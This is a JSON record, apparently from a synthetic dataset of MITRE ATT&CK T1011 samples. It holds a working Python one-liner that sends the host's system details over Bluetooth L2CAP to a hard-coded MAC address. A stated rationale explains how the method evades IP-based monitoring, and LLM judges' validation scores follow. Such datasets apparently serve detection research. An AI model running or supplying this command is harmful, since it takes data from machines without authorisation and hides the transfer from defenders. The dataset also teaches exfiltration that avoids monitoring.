{
  "technique_id": "T1011",
  "platform": "Linux",
  "shell": "Python",
  "command": "python3 -c \"import socket,platform; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('5C:F3:70:12:34:56', 0x1003)); s.sendall(('sys='+str(platform.uname())+'\\n').encode()); s.close()\"",
  "explanation": "Sends host identification over Bluetooth L2CAP PSM 0x1003, bypassing IP-centric monitoring systems per T1011.",
  "rationale_steps": [
    "Pick L2CAP to avoid the main IP-based monitoring plane.",
    "Use a less-common PSM (0x1003) to reduce service collisions.",
    "Serialize minimal system info and send over L2CAP.",
    "Close cleanly to prevent lingering connections."
  ],
  "obfuscation_level": "none",
  "id": "SYN-PYTHON-T1011-2e02ce6e-d365518a",
  "source_prompt_hash": "2e02ce6e",
  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The python3 -c invocation is well-formed with balanced quotes/parentheses and valid Python socket API usage for Bluetooth L2CAP.",
        "semantic_score": 4,
        "semantic_justification": "It plausibly sends host identification over a Bluetooth L2CAP PSM to bypass IP-centric monitoring, aligning with traffic signaling via an out-of-band channel, though it does not embed signals within otherwise legitimate traffic.",
        "combined_score": 4.5,
        "confidence": 0.8,
        "timestamp": "2025-10-01T16:28:06.652695Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, valid syntax, and correct use of Python modules and functions.",
        "semantic_score": 3,
        "semantic_justification": "While the command's intent to use Bluetooth L2CAP for traffic signaling aligns well with T1011, the claim of 'Privilege: None' is semantically incorrect as opening and connecting an L2CAP socket on Linux typically requires `CAP_NET_RAW` or root privileges, making it operationally implausible as described.",
        "combined_score": 4.0,
        "confidence": 0.9,
        "timestamp": "2025-10-01T16:28:23.587293Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed Python code with balanced quotes, parentheses, and proper syntax for socket operations.",
        "semantic_score": 5,
        "semantic_justification": "The command correctly implements traffic signaling by establishing a Bluetooth L2CAP connection to send system information to a specific MAC address using a non-standard PSM (0x1003), which aligns with T1011 by using an alternative communication channel that bypasses traditional network monitoring.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T03:16:42.217470Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 4.0,
    "llm_average_score": 4.5,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}